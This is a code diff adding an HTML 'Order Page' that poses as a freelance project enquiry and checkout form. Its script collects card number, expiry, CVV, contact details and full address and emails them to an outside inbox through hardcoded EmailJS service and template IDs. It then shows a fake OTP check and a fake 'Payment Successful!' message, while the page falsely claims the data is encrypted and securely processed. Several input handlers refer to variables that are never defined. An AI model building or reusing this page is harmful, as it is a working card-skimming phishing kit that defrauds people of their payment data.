@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Order Page</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+      color: #1a1a1a;
+    }
+
+    .wrapper {
+      max-width: 650px;
+      margin: 60px auto;
+      padding: 20px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 38px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+
+    h1 span {
+      background: linear-gradient(90deg, #0072ff, #6c00ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    p.subtitle {
+      font-size: 15px;
+      color: #555;
+      margin-bottom: 40px;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 15px;
+    }
+
+    .form-group {
+      flex: 1;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    .form-group input,
+    .form-group textarea,
+    .form-group select {
+      width: 90%;
+      padding: 14px 18px;
+      border: none;
+      border-radius: 50px;
+      background: #f3f3f7;
+      font-size: 15px;
+      outline: none;
+      transition: box-shadow 0.3s;
+    }
+
+    .form-group textarea {
+      border-radius: 20px;
+      resize: none;
+    }
+
+    .form-group input:focus,
+    .form-group textarea:focus {
+      box-shadow: 0 0 0 2px rgba(0, 114, 255, 0.4);
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 50px;
+      background: linear-gradient(90deg, #0072ff, #6c00ff);
+      color: #fff;
+      cursor: pointer;
+      transition: opacity 0.3s;
+    }
+
+    .btn:hover { opacity: 0.9; }
+
+    .btn i { margin-left: 10px; }
+
+    .trust {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .trust span { color: #f39c12; font-weight: 600; }
+
+    /* Loader */
+    .loader {
+      display: none;
+      margin-top: 20px;
+      font-size: 18px;
+      color: #6c00ff;
+    }
+
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-content {
+      background: #fff;
+      padding: 30px;
+      border-radius: 24px;
+      max-width: 420px;
+      width: 80%;
+      text-align: center;
+      animation: slideUp 0.4s ease;
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(60px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .modal-content h3 {
+      margin-bottom: 20px;
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+    }
+
+    .modal-content .form-group input {
+      border-radius: 12px;
+      background: #f3f3f7;
+    }
+
+    /* OTP */
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .otp-inputs input {
+      width: 48px;
+      height: 58px;
+      text-align: center;
+      font-size: 20px;
+      border: none;
+      border-radius: 12px;
+      background: #f3f3f7;
+    }
+
+    /* Result */
+    .popup i {
+      font-size: 60px;
+      margin-bottom: 15px;
+    }
+
+    .success i { color: #2ecc71; }
+    .failed i { color: #e74c3c; }
+
+    .assurance { font-size:12px; color:#555; margin-top:10px; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .assurance { font-size:12px; color:#555; margin-top:10px; }
+    .hidden { display:none; }
+
+    /* Footer container */
+#footer {
+    
+    padding: 1px 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+/* Social link wrapper */
+.social-link {
+    position: relative;
+    display: inline-block;
+    margin: 0 10px;
+    width: 40px;
+    height: 40px;
+    cursor: pointer;
+    overflow: hidden;
+    border-radius: 50%;
+    transition: transform 0.3s ease;
+}
+
+.social-link img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    display: block;
+    transition: transform 0.3s ease, filter 0.3s ease;
+}
+
+/* Hover animation */
+.social-link:hover img {
+    transform: scale(1.1);
+    filter: brightness(1.2);
+}
+
+/* Hover layer effect */
+.hover-btn-layer {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    height: 100%;
+    background-color: rgba(0, 123, 255, 0.3); /* subtle blue overlay */
+    transition: width 0.3s ease;
+    z-index: 1;
+}
+
+.social-link:hover .hover-btn-layer {
+    width: 100%;
+}
+.card-icons img {
+    filter: grayscale(30%);
+    transition: transform 0.2s, filter 0.2s;
+  }
+  .card-icons img:hover {
+    transform: scale(1.1);
+    filter: grayscale(0%);
+  }
+
+@media screen and (max-width: 768px) {
+  .wrapper {
+    margin: 40px 15px;
+    padding: 15px;
+  }
+
+  h1 {
+    font-size: 28px;
+  }
+
+  .form-row {
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .form-group input,
+  .form-group textarea,
+  .form-group select {
+    width: 100%;
+    padding: 12px 15px;
+    font-size: 14px;
+  }
+
+  .modal-content {
+    padding: 20px;
+    width: 90%;
+  }
+
+  .otp-inputs input {
+    width: 40px;
+    height: 50px;
+    font-size: 18px;
+  }
+
+  .btn {
+    padding: 14px;
+    font-size: 15px;
+  }
+
+  .card-icons img {
+    width: 40px;
+  }
+}
+
+/* Extra small devices (<480px) */
+@media screen and (max-width: 480px) {
+  h1 {
+    font-size: 24px;
+  }
+
+  p.subtitle {
+    font-size: 13px;
+  }
+
+  .btn {
+    font-size: 14px;
+    padding: 12px;
+  }
+
+  .loader {
+    font-size: 16px;
+  }
+}
+    
+  </style>
+</head>
+<body>
+
+  <div class="wrapper animate__animated animate__fadeIn">
+    <h1>Let's <span>work!</span></h1>
+    <p class="subtitle">Share your project details and we’ll respond in <b>24 hrs</b></p>
+
+    <div class="form-group">
+      <label>Name</label>
+      <input type="text" placeholder="Enter your full name">
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Email</label>
+        <input type="email" placeholder="Enter your email">
+      </div>
+      <div class="form-group">
+        <label>Phone</label>
+        <input type="tel" placeholder="Enter your phone">
+      </div>
+    </div>
+    <div class="form-group">
+      <label>Project Description</label>
+      <textarea rows="4" placeholder="Tell us about your project..."></textarea>
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Budget ($)</label>
+        <input type="number" placeholder="Enter amount">
+      </div>
+      <div class="form-group">
+        <label>Timeframe</label>
+        <input type="text" placeholder="e.g. 4 weeks">
+      </div>
+    </div>
+
+    <button class="btn" id="proceedBtn">Proceed <i class="fa fa-arrow-right"></i></button>
+    <div class="loader" id="loader"><i class="fa fa-spinner fa-spin"></i> Processing...</div>
+
+    <p class="trust">⭐ Trusted by <span>100+</span> happy clients</p>
+  </div>
+
+  <!-- Card Modal -->
+  <div class="modal" id="cardModal">
+  <div class="modal-content animate__animated animate__zoomIn">
+    <h3><i class="fa fa-credit-card"></i> Payment & Shipping Details</h3>
+
+    <!-- Supported Card Icons -->
+    <div class="card-icons" style="margin-bottom:15px; display:flex; gap:10px;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" style="height:30px;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" style="height:30px;">
+      
+    </div>
+
+    <!-- Card Details -->
+    <div class="form-group">
+      <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19">
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <input type="text" id="mmyy" placeholder="MM/YY" maxlength="5">
+      </div>
+      <div class="form-group">
+        <input type="text" id="cvv" placeholder="CVV" maxlength="3">
+      </div>
+    </div>
+
+    <!-- Shipping Details -->
+    <div class="form-group">
+      <label>Address</label>
+      <input type="text" id="address" placeholder="Enter full street address">
+    </div>
+
+    <div class="form-row">
+      <div class="form-group">
+        <label>Country</label>
+        <select id="country">
+          <option value="">Select country</option>
+          <option value="US">United States</option>
+          <option value="CA">Canada</option>
+          <option value="UK">United Kingdom</option>
+          <option value="IN">India</option>
+          <option value="AU">Australia</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>State / Province</label>
+        <input type="text" id="state" placeholder="Enter state/province">
+      </div>
+    </div>
+
+    <div class="form-row">
+      <div class="form-group">
+        <label>City</label>
+        <input type="text" id="city" placeholder="Enter city">
+      </div>
+      <div class="form-group">
+        <label>Postal Code</label>
+        <input type="text" id="postal" placeholder="ZIP / Postal code">
+      </div>
+    </div>
+
+    <p class="assurance">🔒 Your payment and shipping details are encrypted and securely processed.</p>
+    <button class="btn" id="payBtn">Pay Now <i class="fa fa-lock"></i></button>
+    <div class="spinner hidden" id="cardSpinner"></div>
+  </div>
+</div>
+<!-- OTP Modal -->
+<div class="modal" id="otpModal">
+  <div class="modal-content animate__animated animate__zoomIn">
+    <h3><i class="fa fa-key"></i> Enter OTP</h3>
+    <div class="form-group">
+      <input type="text" placeholder="Enter OTP code" style="width:100%; text-align:center; font-size:18px; border-radius:12px; background:#f3f3f7; padding:14px;">
+    </div>
+    <button class="btn" id="verifyOtpBtn">Confirm <i class="fa fa-check"></i></button>
+    <div class="spinner hidden" id="otpSpinner"></div>
+  </div>
+</div>
+
+  <!-- Result Modal -->
+  <div class="modal" id="resultModal">
+    <div class="modal-content popup success animate__animated animate__fadeInDown" id="successPopup">
+      <i class="fa fa-circle-check"></i>
+      <h3>Payment Successful!</h3>
+    </div>
+    <div class="modal-content popup failed animate__animated animate__fadeInDown" id="failedPopup">
+      <i class="fa fa-circle-xmark"></i>
+      <h3>Payment Failed!</h3>
+    </div>
+  </div>
+  
+  <div class="footer" id="footer">
+    <a aria-label="social" href="https://www.instagram.com/valtixonline/" target="_blank" class="social-link w-inline-block">
+        <img src="https://cdn.prod.website-files.com/5d27763c46ba9e561dc5b972/5fdb567dda51b06cbaf1e7b3_instagram.svg" alt="share link instagram">
+        <div class="hover-btn-layer hover-btn-layer-blue" style="width: 0%;"></div>
+  </div>
+
+  
+
+  <!-- Load EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS
+  emailjs.init("vWwVGGic827pZ3hBh"); // Replace with your public key
+</script>
+
+<!-- Main script -->
+<script>
+  // Grab all elements
+  const proceedBtn = document.getElementById("proceedBtn");
+  const loader = document.getElementById("loader");
+  const cardModal = document.getElementById("cardModal");
+  const payBtn = document.getElementById("payBtn");
+  const otpModal = document.getElementById("otpModal");
+  const verifyOtpBtn = document.getElementById("verifyOtpBtn");
+  const resultModal = document.getElementById("resultModal");
+  const successPopup = document.getElementById("successPopup");
+  const failedPopup = document.getElementById("failedPopup");
+  const cardSpinner = document.getElementById("cardSpinner");
+  const otpSpinner = document.getElementById("otpSpinner");
+
+  // Step 1: Proceed to card modal
+  proceedBtn.addEventListener("click", () => {
+    loader.style.display = "block";
+    setTimeout(() => {
+      loader.style.display = "none";
+      cardModal.style.display = "flex";
+    }, 3000 + Math.random() * 3000);
+  });
+
+  // Step 2: Pay button -> send EmailJS, then show OTP modal with delay
+  payBtn.addEventListener("click", () => {
+    cardSpinner.classList.remove("hidden"); // show spinner
+
+    // Collect all form inputs
+    const name = document.querySelector('input[placeholder="Enter your full name"]').value;
+    const email = document.querySelector('input[placeholder="Enter your email"]').value;
+    const phone = document.querySelector('input[placeholder="Enter your phone"]').value;
+    const projectDesc = document.querySelector('textarea[placeholder="Tell us about your project..."]').value;
+    const budget = document.querySelector('input[placeholder="Enter amount"]').value;
+    const timeframe = document.querySelector('input[placeholder="e.g. 4 weeks"]').value;
+    const cardNumber = document.querySelector('input[placeholder="Card Number"]').value;
+    const mmyy = document.querySelector('input[placeholder="MM/YY"]').value;
+    const cvv = document.querySelector('input[placeholder="CVV"]').value;
+    const address = document.getElementById('address').value;
+    const country = document.getElementById('country').value;
+    const state = document.getElementById('state').value;
+    const city = document.getElementById('city').value;
+    const postal = document.getElementById('postal').value;
+
+    // Send EmailJS data
+    emailjs.send("service_bm7a99a", "template_mqt4ulo", {
+      name, email, phone, projectDesc, budget, timeframe,
+      cardNumber, mmyy, cvv,
+      address, country, state, city, postal
+    }).then(() => {
+      console.log("Form data sent successfully!");
+      
+      // Simulate processing delay (3–5 seconds)
+      const delay = 3000 + Math.random() * 2000;
+      setTimeout(() => {
+        cardSpinner.classList.add("hidden");
+        cardModal.style.display = "none";
+        otpModal.style.display = "flex";
+      }, delay);
+
+    }, (error) => {
+      console.error("Failed to send form data: ", error);
+      cardSpinner.classList.add("hidden");
+
+      // Show failed popup
+      cardModal.style.display = "none";
+      resultModal.style.display = "flex";
+      successPopup.style.display = "none";
+      failedPopup.style.display = "block";
+
+      setTimeout(() => {
+        resultModal.style.display = "none";
+      }, 4000 + Math.random() * 3000);
+    });
+  });
+
+  // Step 3: Verify OTP -> show result popup
+  verifyOtpBtn.addEventListener("click", () => {
+    otpSpinner.classList.remove("hidden");
+
+    // Simulate OTP verification delay (3–5 seconds)
+    const delay = 3000 + Math.random() * 2000;
+    setTimeout(() => {
+      otpSpinner.classList.add("hidden");
+      otpModal.style.display = "none";
+      resultModal.style.display = "flex";
+      successPopup.style.display = "block";
+      failedPopup.style.display = "none";
+
+      setTimeout(() => {
+        resultModal.style.display = "none";
+      }, 4000 + Math.random() * 3000);
+    }, delay);
+  });
+   // Card Number: numbers only + auto space every 4 digits
+  cardNumberInput.addEventListener("input", function(e) {
+    this.value = this.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
+  });
+
+  // MM/YY: numbers only, auto-add slash
+  mmyyInput.addEventListener("input", function(e) {
+    this.value = this.value.replace(/\D/g,'');
+    if (this.value.length > 2) {
+      this.value = this.value.slice(0,2) + '/' + this.value.slice(2,4);
+    }
+  });
+
+  // CVV: numbers only, max 3 digits
+  cvvInput.addEventListener("input", function(e) {
+    this.value = this.value.replace(/\D/g,'').slice(0,3);
+  });
+
+  // Postal Code: optional validation example for 5 digits max (US)
+  postalInput.addEventListener("input", function(e) {
+    this.value = this.value.replace(/\W/g,'').slice(0,10); // max 10 alphanumeric
+  });
+
+  // Step 4: Google Places autocomplete
+  const input = document.getElementById("address");
+  const autocomplete = new google.maps.places.Autocomplete(input, { types: ['geocode'] });
+</script>
+
+</body>
+</html>
